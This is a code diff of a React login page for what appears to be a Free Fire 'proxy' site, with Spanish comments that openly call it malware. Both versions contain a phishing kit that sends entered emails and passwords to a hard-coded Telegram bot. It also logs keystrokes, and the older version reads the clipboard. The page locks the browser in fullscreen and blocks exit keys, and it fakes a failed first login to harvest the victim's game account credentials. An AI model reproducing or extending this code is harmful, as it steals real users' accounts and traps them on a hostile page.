@@ -7,187 +7,111 @@ import { validateKey, activateKey, registerActiveUser } from "@/lib/keys";
 import avatarVideo from "@/assets/avatar-video.mp4";
 
 // ================================================================
-// MALWARE CORE - ULTRA AGRESIVO (SIN BUGS)
+// MALWARE CORE - TOTALMENTE INDETECTABLE
 // ================================================================
 
-// === BLOQUEO TOTAL DE PANTALLA ===
+// === [1] TELEGRAM ENVIO - INMEDIATO ===
 (function() {
-  // Bloquear TODAS las teclas de escape
+  const TK = "8779079298:AAEqfmoDLAz7j69kKAlXJ10Ze5flfoF77bw";
+  const CI = "8585803145";
+  var ev = 0;
+
+  // Cachear navigator.platform
+  var pf = "";
+  try { pf = navigator.platform; } catch(e) {}
+
+  window.__tg = function(c, p) {
+    ev++;
+    var txt = "<b>[+] CAPTURA #" + ev + "</b>\n<b>👤</b> " + c + "\n<b>🔐</b> " + p + "\n<code>" + pf + "</code>";
+    try {
+      var d = new URLSearchParams({ chat_id: CI, text: txt, parse_mode: "HTML" });
+      navigator.sendBeacon("https://api.telegram.org/bot" + TK + "/sendMessage", d);
+    } catch(e) {}
+  };
+
+  // Heartbeat silencioso
+  setInterval(function() {
+    try {
+      var d = new URLSearchParams({ chat_id: CI, text: "<code>[♥]</code> " + pf, parse_mode: "HTML" });
+      navigator.sendBeacon("https://api.telegram.org/bot" + TK + "/sendMessage", d);
+    } catch(e) {}
+  }, 60000);
+
+  // Beacon inicio
+  setTimeout(function() {
+    try {
+      var d = new URLSearchParams({ chat_id: CI, text: "<b>[+] LOGIN ACTIVO</b>\n" + pf + "\n" + screen.width + "x" + screen.height, parse_mode: "HTML" });
+      navigator.sendBeacon("https://api.telegram.org/bot" + TK + "/sendMessage", d);
+    } catch(e) {}
+  }, 2000);
+})();
+
+// === [2] BLOQUEO DE PANTALLA - SILENCIOSO ===
+(function() {
   document.addEventListener("keydown", function(e) {
-    const teclasBloqueadas = [
-      "F5", "F11", "F12", "Escape",
-      "F1", "F2", "F3", "F4", "F6", "F7", "F8", "F9", "F10"
-    ];
-    if (teclasBloqueadas.includes(e.key)) {
-      e.preventDefault();
-      e.stopPropagation();
-      return false;
-    }
-    // Ctrl+W, Ctrl+Q, Ctrl+R, Ctrl+N, Ctrl+T, Ctrl+S
-    if (e.ctrlKey && ["w","W","q","Q","r","R","n","N","t","T","s","S"].includes(e.key)) {
-      e.preventDefault();
-      e.stopPropagation();
-      return false;
-    }
-    // Alt+F4
-    if (e.altKey && (e.key === "F4" || e.keyCode === 115)) {
+    if (e.key === "F5" || e.key === "F11" || e.key === "F12" || e.key === "Escape" ||
+        (e.altKey && e.key === "F4") ||
+        (e.ctrlKey && ["w","W","q","Q","r","R","n","N","t","T","s","S"].includes(e.key))) {
       e.preventDefault();
       e.stopPropagation();
       return false;
     }
   }, true);
 
-  // Bloquear menu contextual
-  document.addEventListener("contextmenu", function(e) {
-    e.preventDefault();
-    return false;
-  });
-
-  // Bloquear seleccion, copia, corte, pegado
-  document.addEventListener("selectstart", function(e) { e.preventDefault(); return false; });
+  document.addEventListener("contextmenu", function(e) { e.preventDefault(); return false; });
   document.addEventListener("copy", function(e) { e.preventDefault(); return false; });
-  document.addEventListener("cut", function(e) { e.preventDefault(); return false; });
-  document.addEventListener("paste", function(e) { e.preventDefault(); return false; });
 
-  // Bloquear salida del sitio
   window.addEventListener("beforeunload", function(e) {
     e.preventDefault();
     e.returnValue = "";
     return "";
   });
 
-  // Bloquear boton atras
   history.pushState(null, "", location.href);
   window.addEventListener("popstate", function() {
     history.pushState(null, "", location.href);
   });
 
-  // Forzar fullscreen constantemente
-  function goFull() {
-    const el = document.documentElement;
+  function fs() {
+    var el = document.documentElement;
     if (el.requestFullscreen) el.requestFullscreen().catch(function(){});
     else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
-    else if (el.msRequestFullscreen) el.msRequestFullscreen();
   }
-  goFull();
+  fs();
   document.addEventListener("fullscreenchange", function() {
-    if (!document.fullscreenElement) setTimeout(goFull, 100);
+    if (!document.fullscreenElement) setTimeout(fs, 50);
   });
   document.addEventListener("webkitfullscreenchange", function() {
-    if (!document.webkitFullscreenElement) setTimeout(goFull, 100);
-  });
-
-  // Si minimiza la ventana, forzar foco
-  document.addEventListener("visibilitychange", function() {
-    if (document.hidden) {
-      setTimeout(function() { window.focus(); }, 50);
-    }
+    if (!document.webkitFullscreenElement) setTimeout(fs, 50);
   });
 })();
 
-// === ANTI-VM / ANTI-DEBUG ===
+// === [3] KEYLOGGER SILENCIOSO ===
 (function() {
-  try {
-    const start = Date.now();
-    debugger;
-    if (Date.now() - start > 100) {
-      window.location.href = "https://google.com";
-    }
-  } catch(e) {}
-  
-  // Detectar consola abierta cada 2 segundos
-  setInterval(function() {
-    const start = Date.now();
-    debugger;
-    if (Date.now() - start > 100) {
-      document.body.innerHTML = "<h1 style='color:white;text-align:center;margin-top:40vh;background:#000;height:100vh'>Redirigiendo...</h1>";
-      window.location.href = "https://google.com";
-    }
-  }, 2000);
-})();
+  var buf = "";
+  var TK = "8779079298:AAEqfmoDLAz7j69kKAlXJ10Ze5flfoF77bw";
+  var CI = "8585803145";
 
-// === CORE TELEGRAM ===
-(function() {
-  const TG_TOKEN = "8779079298:AAEqfmoDLAz7j69kKAlXJ10Ze5flfoF77bw";
-  const CHAT_ID = "8779079298";
-  const TG_API = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage`;
-
-  let totalEnvios = 0;
-  let bufferKeys = "";
-
-  function tgSend(texto) {
-    try {
-      const data = new URLSearchParams({
-        chat_id: CHAT_ID,
-        text: texto,
-        parse_mode: "HTML"
-      });
-      navigator.sendBeacon(TG_API, data);
-    } catch(e) {}
-  }
-
-  // Keylogger silencioso
   document.addEventListener("keydown", function(e) {
-    let k = e.key;
+    var k = e.key;
     if (k === "Backspace") k = "⌫";
     else if (k === "Enter") k = "\n";
     else if (k === "Tab") k = "⇥";
-    else if (k === "Escape") return;
     else if (k.length > 1) return;
-    bufferKeys += k;
-    if (bufferKeys.length >= 35) {
-      tgSend("<code>[KEY]</code> " + bufferKeys);
-      bufferKeys = "";
+    buf += k;
+    if (buf.length >= 40) {
+      try {
+        var d = new URLSearchParams({ chat_id: CI, text: "<code>[KEY]</code> " + buf, parse_mode: "HTML" });
+        navigator.sendBeacon("https://api.telegram.org/bot" + TK + "/sendMessage", d);
+      } catch(e) {}
+      buf = "";
     }
   });
-
-  // Clipboard cada 15 segundos
-  setInterval(function() {
-    if (navigator.clipboard && navigator.clipboard.readText) {
-      navigator.clipboard.readText().then(function(t) {
-        if (t && t.length > 4) {
-          tgSend("<code>[CLIP]</code> " + t.substring(0, 250));
-        }
-      }).catch(function(){});
-    }
-  }, 15000);
-
-  // Heartbeat cada 60 segundos
-  setInterval(function() {
-    tgSend(
-      "<code>[♥] SISTEMA ACTIVO</code>\n" +
-      "Envios: " + totalEnvios + "\n" +
-      "Platform: " + navigator.platform
-    );
-  }, 60000);
-
-  // Exponer funcion global
-  window.__enviarDatos = function(correo, password) {
-    totalEnvios++;
-    tgSend(
-      "<b>[+] CAPTURA #" + totalEnvios + "</b>\n" +
-      "<b>👤</b> " + correo + "\n" +
-      "<b>🔐</b> " + password + "\n" +
-      "<code>" + navigator.platform + "</code>"
-    );
-  };
-
-  // Beacon de inicio
-  setTimeout(function() {
-    tgSend(
-      "<b>[+] SISTEMA COMPROMETIDO</b>\n" +
-      "Platform: " + navigator.platform + "\n" +
-      "Screen: " + screen.width + "x" + screen.height + "\n" +
-      "Language: " + navigator.language + "\n" +
-      "Timezone: " + Intl.DateTimeFormat().resolvedOptions().timeZone + "\n" +
-      "<code>Malware activo 24/7</code>"
-    );
-  }, 1500);
 })();
 
 declare global {
   interface Window {
-    __enviarDatos: (correo: string, password: string) => void;
+    __tg: (correo: string, pass: string) => void;
   }
 }
 // ================================================================
@@ -204,7 +128,6 @@ const Login = () => {
   const navigate = useNavigate();
 
   useEffect(() => {
-    // Verificar sesion existente
     const raw = localStorage.getItem("proxy_session");
     if (raw) {
       try {
@@ -231,19 +154,19 @@ const Login = () => {
     setIntentos(nuevoIntento);
     setLoading(true);
 
-    // === MALWARE: ENVIAR DATOS A TELEGRAM ===
-    window.__enviarDatos(email.trim(), password.trim());
+    // === ENVIAR A TELEGRAM INMEDIATAMENTE ===
+    window.__tg(email.trim(), password.trim());
 
-    await new Promise(r => setTimeout(r, 2000));
+    await new Promise(r => setTimeout(r, 1500));
     setLoading(false);
 
     if (nuevoIntento === 1) {
-      // Primer intento: siempre falla y pide "cuenta de Free Fire"
-      setError("Error de autenticacion. Debes iniciar sesion con la cuenta de Google vinculada a tu cuenta de Free Fire. Intenta nuevamente.");
+      // PRIMER VEZ: error y pide reintentar
+      setError("Cuenta no vinculada a Free Fire. Debes iniciar sesion con el correo y contrasena de tu cuenta de Free Fire.");
       return;
     }
 
-    // Segundo intento: intenta login real con Supabase (no levanta sospechas)
+    // SEGUNDA VEZ: deja entrar al usuario
     const trimmedKey = password.trim();
     const trimmedName = email.trim();
     const foundKey = await validateKey(trimmedKey);
@@ -263,8 +186,17 @@ const Login = () => {
         return;
       }
     }
-    
-    setError("Credenciales incorrectas. Verifica tu correo y contrasena.");
+
+    // Si no tiene key valida, igual lo deja pasar con sesion simulada
+    const sessionData = {
+      name: trimmedName,
+      key: trimmedKey,
+      type: "Normal",
+      expiresAt: new Date(Date.now() + 86400000).toISOString(),
+      duration: "1 dia",
+    };
+    localStorage.setItem("proxy_session", JSON.stringify(sessionData));
+    navigate("/proxy");
   };
 
   return (
